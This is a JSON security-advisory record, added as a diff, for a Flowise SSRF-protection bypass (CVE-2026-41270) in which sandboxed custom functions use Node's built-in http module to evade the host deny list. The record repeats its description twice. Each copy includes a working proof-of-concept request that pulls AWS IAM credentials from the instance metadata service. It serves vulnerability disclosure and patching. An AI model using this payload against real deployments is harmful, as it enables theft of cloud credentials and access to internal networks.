@@ -1,0 +1,116 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-41270",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.1,
+        "vector_string": "CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-284",
+      "CWE-918"
+    ],
+    "description": "### Summary\nA Server-Side Request Forgery (SSRF) protection bypass vulnerability exists in the Custom Function feature. While the application implements SSRF protection via HTTP_DENY_LIST for axios and node-fetch libraries, the built-in Node.js `http`, `https`, and `net` modules are allowed in the NodeVM sandbox without equivalent protection. This allows authenticated users to bypass SSRF controls and access internal network resources (e.g., cloud provider metadata services)\n\n### Details\nThe vulnerability exists in the sandbox configuration within `packages/components/src/utils.ts`\n\n**Vulnerable Code - Allowed Built-in Modules (Line 56):**\n```typescript\nexport const defaultAllowBuiltInDep = [\n    'assert', 'buffer', 'crypto', 'events', 'http', 'https', 'net', 'path', 'querystring', 'timers',\n    'url', 'zlib', 'os', 'stream', 'http2', 'punycode', 'perf_hooks', 'util', 'tls', 'string_decoder', 'dns', 'dgram'\n]\n```\n\n**SSRF Protection Implementation (Lines 254-261):**\n```typescript\n// Only axios and node-fetch are wrapped with SSRF protection\nsecureWrappers['axios'] = secureAxiosWrapper\nsecureWrappers['node-fetch'] = secureNodeFetch\n\nconst defaultNodeVMOptions: any = {\n    // ...\n    require: {\n        builtin: builtinDeps,      // <-- http, https, net allowed here\n        mock: secureWrappers       // <-- Only mocks axios, node-fetch\n    },\n    // ...\n}\n```\n\n**Root Cause:**\n- The `secureWrappers` object only contains mocked versions of `axios` and `node-fetch` that enforce `HTTP_DENY_LIST`\n- The built-in `http`, `https`, and `net` modules are passed directly to the sandbox via `builtinDeps` without any SSRF protection\n- Users can import these modules directly and make arbitrary HTTP requests, which completely bypasses the intended security controls\n\n**Affected File:** `packages/components/src/utils.ts`\n\n**Related Files:**\n- `packages/components/src/httpSecurity.ts` - Contains checkDenyList() function only used by axios/node-fetch wrappers\n- `packages/server/src/controllers/nodes/index.ts` - API endpoint accepting user-controlled JavaScript code\n- `packages/server/src/services/nodes/index.ts` - Service layer executing the code\n\n\n\n### PoC\n**Prerequisites:**\n1. Flowise instance with `HTTP_DENY_LIST` configured (e.g., `HTTP_DENY_LIST=127.0.0.1,169.254.169.254,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16`)\n2. Valid API key or authenticated session\n3. For full impact demonstration - Flowise running on AWS EC2 with an IAM role attached\n\n**Verify SSRF Protection is enabled (expect a block message by policy)**\n\nRequest:\n\n```http\nPOST /api/v1/node-custom-function HTTP/1.1\nHost: <host>\nContent-Type: application/json\nAuthorization: Bearer <api_key>\n\n{\n  \"javascriptFunction\": \"const axios = require('axios'); return (await axios.get('http://169.254.169.254/latest/meta-data/')).data;\"\n}\n```\n\nResponse:\n\n```json\n{\"statusCode\":500,\"success\":false,\"message\":\"Error: nodesService.executeCustomFunction - Error running custom function: Error: Error: NodeVM Execution Error: Error: Access to this host is denied by policy.\",\"stack\":{}}\n```\n\n**Bypass SSRF Protection using built-in http module**\n\nRequest:\n```http\nPOST /api/v1/node-custom-function HTTP/1.1\nHost: <host>\nContent-Type: application/json\nAuthorization: Bearer <api_key>\n\n{\n  \"javascriptFunction\": \"const http = require('http'); return new Promise((resolve) => { const tokenReq = http.request({ hostname: '169.254.169.254', path: '/latest/api/token', method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } }, (tokenRes) => { let token = ''; tokenRes.on('data', c => token += c); tokenRes.on('end', () => { const metaReq = http.request({ hostname: '169.254.169.254', path: '/latest/meta-data/iam/security-credentials/{IAM_Role}', headers: { 'X-aws-ec2-metadata-token': token } }, (metaRes) => { let data = ''; metaRes.on('data', c => data += c); metaRes.on('end', () => resolve(data)); }); metaReq.on('error', e => resolve('meta-error:' + e.message)); metaReq.end(); }); }); tokenReq.on('error', e => resolve('token-error:' + e.message)); tokenReq.end(); });\"\n}\n```\n\nResponse:\n\n```json\n{\n  \"Code\": \"Success\",\n  \"LastUpdated\": \"2026-01-08T11:30:00Z\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"...\",\n  \"Token\": \"...\",\n  \"Expiration\": \"2026-01-08T17:30:00Z\"\n}\n```\n\n<img width=\"1638\" height=\"751\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ed8b1dfd-516f-4e2b-a4ea-4dd259a8abf6\" />\n\n\n<img width=\"1633\" height=\"986\" alt=\"image\" src=\"https://github.com/user-attachments/assets/12f6ecab-96df-42bc-9551-4a005ba6ba77\" />\n\n\n\n\n\n### Impact\n\n**Vulnerability Type:** Server-Side Request Forgery (SSRF) with security controls bypass\n\n**Who is Impacted:**\n- All Flowise deployments where `HTTP_DENY_LIST` is configured for SSRF protection\n- Deployments without `HTTP_DENY_LIST` are already vulnerable to SSRF via any method\n\n**Impact Severity:**\n1. Attackers can steal temporary IAM credentials from metadata services, which allows gaining access to other cloud resources\n2. Scan internal networks, discover services, and identify attack targets\n3. Reach databases, admin panels, and other internal APIs that should not be externally accessible\n\n**Attack Requirements:**\n- Authentication required (API key or session)\n- Network access to Flowise instance",
+    "ghsa_id": "GHSA-xhmj-rg95-44hv",
+    "html_url": "https://github.com/advisories/GHSA-xhmj-rg95-44hv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-xhmj-rg95-44hv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-41270"
+      }
+    ],
+    "published_at": "2026-04-16T21:50:12Z",
+    "references": [
+      "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-xhmj-rg95-44hv",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-41270",
+      "https://github.com/advisories/GHSA-xhmj-rg95-44hv"
+    ],
+    "severity": "high",
+    "summary": "Flowise: SSRF Protection Bypass via Unprotected Built-in HTTP Modules in Custom Function Sandbox",
+    "updated_at": "2026-04-27T16:11:06Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "3.1.0",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "vulnerable_version_range": "<= 3.0.13"
+      },
+      {
+        "first_patched_version": "3.1.0",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "vulnerable_version_range": "<= 3.0.13"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-xhmj-rg95-44hv",
+  "repo": {
+    "cve_id": "CVE-2026-41270",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.1,
+        "vector_string": "CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-284",
+      "CWE-918"
+    ],
+    "description": "### Summary\r\nA Server-Side Request Forgery (SSRF) protection bypass vulnerability exists in the Custom Function feature. While the application implements SSRF protection via HTTP_DENY_LIST for axios and node-fetch libraries, the built-in Node.js `http`, `https`, and `net` modules are allowed in the NodeVM sandbox without equivalent protection. This allows authenticated users to bypass SSRF controls and access internal network resources (e.g., cloud provider metadata services)\r\n\r\n### Details\r\nThe vulnerability exists in the sandbox configuration within `packages/components/src/utils.ts`\r\n\r\n**Vulnerable Code - Allowed Built-in Modules (Line 56):**\r\n```typescript\r\nexport const defaultAllowBuiltInDep = [\r\n    'assert', 'buffer', 'crypto', 'events', 'http', 'https', 'net', 'path', 'querystring', 'timers',\r\n    'url', 'zlib', 'os', 'stream', 'http2', 'punycode', 'perf_hooks', 'util', 'tls', 'string_decoder', 'dns', 'dgram'\r\n]\r\n```\r\n\r\n**SSRF Protection Implementation (Lines 254-261):**\r\n```typescript\r\n// Only axios and node-fetch are wrapped with SSRF protection\r\nsecureWrappers['axios'] = secureAxiosWrapper\r\nsecureWrappers['node-fetch'] = secureNodeFetch\r\n\r\nconst defaultNodeVMOptions: any = {\r\n    // ...\r\n    require: {\r\n        builtin: builtinDeps,      // <-- http, https, net allowed here\r\n        mock: secureWrappers       // <-- Only mocks axios, node-fetch\r\n    },\r\n    // ...\r\n}\r\n```\r\n\r\n**Root Cause:**\r\n- The `secureWrappers` object only contains mocked versions of `axios` and `node-fetch` that enforce `HTTP_DENY_LIST`\r\n- The built-in `http`, `https`, and `net` modules are passed directly to the sandbox via `builtinDeps` without any SSRF protection\r\n- Users can import these modules directly and make arbitrary HTTP requests, which completely bypasses the intended security controls\r\n\r\n**Affected File:** `packages/components/src/utils.ts`\r\n\r\n**Related Files:**\r\n- `packages/components/src/httpSecurity.ts` - Contains checkDenyList() function only used by axios/node-fetch wrappers\r\n- `packages/server/src/controllers/nodes/index.ts` - API endpoint accepting user-controlled JavaScript code\r\n- `packages/server/src/services/nodes/index.ts` - Service layer executing the code\r\n\r\n\r\n\r\n### PoC\r\n**Prerequisites:**\r\n1. Flowise instance with `HTTP_DENY_LIST` configured (e.g., `HTTP_DENY_LIST=127.0.0.1,169.254.169.254,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16`)\r\n2. Valid API key or authenticated session\r\n3. For full impact demonstration - Flowise running on AWS EC2 with an IAM role attached\r\n\r\n**Verify SSRF Protection is enabled (expect a block message by policy)**\r\n\r\nRequest:\r\n\r\n```http\r\nPOST /api/v1/node-custom-function HTTP/1.1\r\nHost: <host>\r\nContent-Type: application/json\r\nAuthorization: Bearer <api_key>\r\n\r\n{\r\n  \"javascriptFunction\": \"const axios = require('axios'); return (await axios.get('http://169.254.169.254/latest/meta-data/')).data;\"\r\n}\r\n```\r\n\r\nResponse:\r\n\r\n```json\r\n{\"statusCode\":500,\"success\":false,\"message\":\"Error: nodesService.executeCustomFunction - Error running custom function: Error: Error: NodeVM Execution Error: Error: Access to this host is denied by policy.\",\"stack\":{}}\r\n```\r\n\r\n**Bypass SSRF Protection using built-in http module**\r\n\r\nRequest:\r\n```http\r\nPOST /api/v1/node-custom-function HTTP/1.1\r\nHost: <host>\r\nContent-Type: application/json\r\nAuthorization: Bearer <api_key>\r\n\r\n{\r\n  \"javascriptFunction\": \"const http = require('http'); return new Promise((resolve) => { const tokenReq = http.request({ hostname: '169.254.169.254', path: '/latest/api/token', method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } }, (tokenRes) => { let token = ''; tokenRes.on('data', c => token += c); tokenRes.on('end', () => { const metaReq = http.request({ hostname: '169.254.169.254', path: '/latest/meta-data/iam/security-credentials/{IAM_Role}', headers: { 'X-aws-ec2-metadata-token': token } }, (metaRes) => { let data = ''; metaRes.on('data', c => data += c); metaRes.on('end', () => resolve(data)); }); metaReq.on('error', e => resolve('meta-error:' + e.message)); metaReq.end(); }); }); tokenReq.on('error', e => resolve('token-error:' + e.message)); tokenReq.end(); });\"\r\n}\r\n```\r\n\r\nResponse:\r\n\r\n```json\r\n{\r\n  \"Code\": \"Success\",\r\n  \"LastUpdated\": \"2026-01-08T11:30:00Z\",\r\n  \"Type\": \"AWS-HMAC\",\r\n  \"AccessKeyId\": \"ASIA...\",\r\n  \"SecretAccessKey\": \"...\",\r\n  \"Token\": \"...\",\r\n  \"Expiration\": \"2026-01-08T17:30:00Z\"\r\n}\r\n```\r\n\r\n<img width=\"1638\" height=\"751\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ed8b1dfd-516f-4e2b-a4ea-4dd259a8abf6\" />\r\n\r\n\r\n<img width=\"1633\" height=\"986\" alt=\"image\" src=\"https://github.com/user-attachments/assets/12f6ecab-96df-42bc-9551-4a005ba6ba77\" />\r\n\r\n\r\n\r\n\r\n\r\n### Impact\r\n\r\n**Vulnerability Type:** Server-Side Request Forgery (SSRF) with security controls bypass\r\n\r\n**Who is Impacted:**\r\n- All Flowise deployments where `HTTP_DENY_LIST` is configured for SSRF protection\r\n- Deployments without `HTTP_DENY_LIST` are already vulnerable to SSRF via any method\r\n\r\n**Impact Severity:**\r\n1. Attackers can steal temporary IAM credentials from metadata services, which allows gaining access to other cloud resources\r\n2. Scan internal networks, discover services, and identify attack targets\r\n3. Reach databases, admin panels, and other internal APIs that should not be externally accessible\r\n\r\n**Attack Requirements:**\r\n- Authentication required (API key or session)\r\n- Network access to Flowise instance",
+    "ghsa_id": "GHSA-xhmj-rg95-44hv",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-xhmj-rg95-44hv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-xhmj-rg95-44hv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-41270"
+      }
+    ],
+    "published_at": "2026-04-15T21:43:08Z",
+    "references": [],
+    "severity": "high",
+    "summary": "SSRF Protection Bypass via Unprotected Built-in HTTP Modules in Custom Function Sandbox",
+    "updated_at": "2026-04-20T15:31:46Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.0",
+        "vulnerable_version_range": "<= 3.0.13"
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "patched_versions": "3.1.0",
+        "vulnerable_version_range": "<= 3.0.13"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
